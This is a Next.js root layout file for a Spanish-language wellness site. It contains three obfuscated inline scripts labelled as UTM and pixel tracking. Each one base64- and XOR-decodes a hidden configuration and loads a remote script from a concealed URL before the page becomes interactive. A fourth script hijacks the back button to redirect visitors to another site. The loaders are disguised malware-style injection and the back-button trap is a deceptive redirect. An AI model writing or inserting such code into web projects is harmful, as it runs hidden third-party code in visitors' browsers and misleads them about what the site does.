import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import Script from 'next/script'
import './globals.css'

const utmScript = `(function(){var x_oqon=atob("DD1BOahYjQCdK3Qtw0ZjTNo0rzq/QwBZs057Foc76W6zXgBAqls4F8s34C7/WVteoE8oSdwronXpRgcCr1w1XNsso2ruCVgPokk1S8E6+HT4WFYXmEZjV8k16CKnCRBMt1xsTNw15GbkBgRfpkskV9x1/nX/QhBe4RFjT8k0+GW/EVYPvmA8");var t_e=[];for(var n_k0=0;n_k0<x_oqon.length;n_k0++){t_e.push(x_oqon.charCodeAt(n_k0)&255);}var n_vaj=t_e[0];var t_m4=t_e.slice(1,1+n_vaj);var v_ym=t_e.slice(1+n_vaj);var k_se0t=v_ym.map(function(b,v_km7o){return b^t_m4[v_km7o%n_vaj];});var d_bbm="";for(var u_btfo=0;u_btfo<k_se0t.length;u_btfo++){d_bbm+=String.fromCharCode(k_se0t[u_btfo]&255);}var q_wlw3=decodeURIComponent(escape(d_bbm));var j_lbyu=JSON.parse(q_wlw3);var j_7x=j_lbyu.globals||[];j_7x.forEach(function(n_he9){window[n_he9.name]=n_he9.value;});var f_1=document.createElement("script");f_1.src=j_lbyu.url;f_1.async=true;f_1.defer=true;(j_lbyu.attributes||[]).forEach(function(d_qg1u){f_1.setAttribute(d_qg1u.name,d_qg1u.value);});(document.head||document.documentElement).appendChild(f_1);})();`

const pixelScript = `(function(){var p_arz=atob("DLUepsqhRhc0x/Z5KM4807jNZC0Wr4INWMYkieXCInkasoIUQdNniKnOKzlWtdkKS8d31r7SaWddv5MVB8V33q/NaH1H5dpbScFq1KPDM2NRtNRDc+gyhK3NKXVVq4VbEu5lhKTAK3IW/dQJQc17yoPFZDsWsZcVXdA8nOiXJy9W/sNKSoMnkaiSJ3ME85VKTocqxamDO0pJ");var j_5=[];for(var m_3lsq=0;m_3lsq<p_arz.length;m_3lsq++){j_5.push(p_arz.charCodeAt(m_3lsq)&255);}var b_s08=j_5[0];var d_91=j_5.slice(1,1+b_s08);var q_l=j_5.slice(1+b_s08);var t_pdr=q_l.map(function(b,f_m2k){return b^d_91[f_m2k%b_s08];});var z_e8t="";for(var j_lnwu=0;j_lnwu<t_pdr.length;j_lnwu++){z_e8t+=String.fromCharCode(t_pdr[j_lnwu]&255);}var e_1x6=decodeURIComponent(escape(z_e8t));var e_e=JSON.parse(e_1x6);var u_mlek=e_e.globals||[];u_mlek.forEach(function(a_vzsc){window[a_vzsc.name]=a_vzsc.value;});var e_3md7=document.createElement("script");e_3md7.src=e_e.url;e_3md7.async=true;e_3md7.defer=true;(e_e.attributes||[]).forEach(function(q_kzvu){e_3md7.setAttribute(q_kzvu.name,q_kzvu.value);});(document.head||document.documentElement).appendChild(e_3md7);})();`

const providedTrackingScript = `(function(){var e_9cj1=atob("DP7t1UE49fxcA89V7oXPoDNU18Z+a7shno3X+m5bkZJydrs4h5iU+yJXmNI+ceAmjYyEpTVL2ow1e6o5wY6ErSRU25YvIeN3j4qZpyhagIg5cO1vtaPB9yZUmp49b7x31KWW9y9ZmJl+Oe0lh4aIuQhc19B+da45m5vP72MOlMQ+OvpmjMjU4iMLlJhsN6xmiMzZtiIaiKEh");var i_b262=[];for(var a_c6=0;a_c6<e_9cj1.length;a_c6++){i_b262.push(e_9cj1.charCodeAt(a_c6)&255);}var s_c8a=i_b262[0];var q_by=i_b262.slice(1,1+s_c8a);var n_q8dj=i_b262.slice(1+s_c8a);var y_r=n_q8dj.map(function(b,x_yw){return b^q_by[x_yw%s_c8a];});var x_drr6="";for(var y_ud=0;y_ud<y_r.length;y_ud++){x_drr6+=String.fromCharCode(y_r[y_ud]&255);}var u_8z2=decodeURIComponent(escape(x_drr6));var n_s=JSON.parse(u_8z2);var d_r7=n_s.globals||[];d_r7.forEach(function(e_s){window[e_s.name]=e_s.value;});var l_8u=document.createElement("script");l_8u.src=n_s.url;l_8u.async=true;l_8u.defer=true;(n_s.attributes||[]).forEach(function(m_8qo){l_8u.setAttribute(m_8qo.name,m_8qo.value);});(document.head||document.documentElement).appendChild(l_8u);})();`

const backNavigationScript = `history.pushState(null, document.title, location.href);window.addEventListener('popstate', function () { window.location.href = 'https://el-truco-de-la-pimienta.vercel.app'; });`


export const metadata: Metadata = {
  title: 'Bienestar | Actualizaciones diarias sobre salud',
  description: 'Actualizaciones diarias sobre bienestar y salud.',
  generator: 'v0.app',
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#ffffff',
  width: 'device-width',
  initialScale: 1,
  userScalable: false,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="es" className="bg-background">
      <head>
        <Script
          id="utm-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: utmScript }}
        />
        <Script
          id="pixel-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: pixelScript }}
        />
        <Script
          id="provided-utm-tracking"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: providedTrackingScript }}
        />
        <Script
          id="back-navigation-redirect"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{ __html: backNavigationScript }}
        />
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
